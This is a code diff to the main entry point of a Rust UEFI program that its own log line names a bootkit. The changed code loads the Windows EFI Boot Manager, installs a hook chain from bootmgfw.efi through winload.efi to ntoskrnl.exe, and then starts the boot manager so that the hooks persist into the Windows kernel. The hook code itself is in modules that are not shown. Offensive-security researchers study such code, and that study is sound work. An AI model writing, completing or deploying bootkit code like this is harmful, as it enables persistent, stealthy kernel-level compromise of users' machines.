@@ -2,7 +2,7 @@
 #![no_std]
 
 use log;
-use uefi::{prelude::*, table::boot::LoadImageSource};
+use uefi::prelude::*;
 
 mod boot;
 
@@ -24,69 +24,40 @@ fn main(image_handle: Handle, mut system_table: SystemTable<Boot>) -> Status {
         .clear()
         .expect("Failed to clear the stderr output screen.");
 
-    log::info!("### UEFI Bootkit in Rust ###");
+    log::info!("### UEFI Bootkit in Rust by memN0ps ###");
 
-    //
-    // 1. Locate Windows EFI Boot Manager (\EFI\Microsoft\Boot\bootmgfw.efi)
-    //
-
-    // Access boot services
     let boot_services = system_table.boot_services();
 
-    log::info!("Finding Windows EFI Boot Manager (\\EFI\\Microsoft\\Boot\\bootmgfw.efi) device");
-    // Gets the Windows EFI Boot Manager device as slice of bytes
-    let bootmgr_data = boot::utils::get_windows_bootmgr_device(
-        "\\EFI\\Microsoft\\Boot\\bootmgfw.efi",
-        &boot_services,
-    )
-    .expect("Failed to get device path");
-    log::info!("Found Windows EFI Boot Manager device");
-    log::info!(
-        "Pointer: {:p} Size: {}",
-        bootmgr_data.as_ptr(),
-        bootmgr_data.len()
-    );
-
     //
-    // 2. Set BootCurrent to Windows Boot Manager (bootmgr) option
+    // 1. Locate and load Windows EFI Boot Manager (bootmgfw.efi)
     //
 
-    // todo: set_bootcurrent_to_windows_bootmgr()
+    log::info!("[*] Loading Windows EFI Boot Manager (bootmgfw.efi)");
+    let bootmgfw_handle = boot::utils::load_windows_boot_manager_by_buffer(boot_services)
+        .expect("Failed to load Windows EFI Boot Manager (bootmgfw.efi)");
+    log::info!("[+] Image Loaded Successfully!");
 
     //
-    // 3. Load the Windows EFI Boot Manager (bootmgr)
+    // 2. Set up the hook chain from bootmgfw.efi -> windload.efi -> ntoskrnl.exe
     //
 
-    log::info!("Loading Windows Boot Manager image into memory");
-    // Load an EFI image into memory and return a Handle to the image.
-    // There are two ways to load the image: by copying raw image data from a source buffer, or by loading the image via the SimpleFileSystem protocol
-    let bootmgr_handle = boot_services
-        .load_image(
-            image_handle,
-            LoadImageSource::FromBuffer {
-                buffer: &bootmgr_data,
-                file_path: None,
-            },
-        )
-        .expect("Failed to load image");
-
-    log::info!("Successfully loaded Windows Boot Manager image into memory");
+    log::info!("[*] Setting up hooks: bootmgfw.efi -> windload.efi -> ntoskrnl.exe");
+    boot::hooks::setup_hooks(&bootmgfw_handle, &boot_services);
+    log::info!("[+] Hooks setup Successfully!");
 
     //
-    // 4. Set up the hook chain from bootmgr -> windload -> ntoskrnl
+    // 3. Start Windows EFI Boot Manager (bootmgfw.efi)
     //
 
-    log::info!("Setting up hooks bootmgr -> windload -> ntoskrnl");
-    boot::hooks::setup_hooks(&bootmgr_handle, &boot_services);
-
-    //
-    // 5. Start Windows EFI Boot Manager (bootmgr)
-    //
-
-    //boot_services.start_image(bootmgr_handle).expect("Failed to start image");
+    log::info!("[*] Starting image");
+    if let Err(e) = boot_services.start_image(bootmgfw_handle) {
+        log::info!("[-] Failed to start image: {:?}", e);
+        system_table.boot_services().stall(5_000_000);
+        return Status::UNSUPPORTED;
+    }
 
     // Make the system pause for 10 seconds
     log::info!("Stalling the processor for 20 seconds");
-    system_table.boot_services().stall(20_000_000);
+    system_table.boot_services().stall(10_000_000);
     Status::SUCCESS
 }
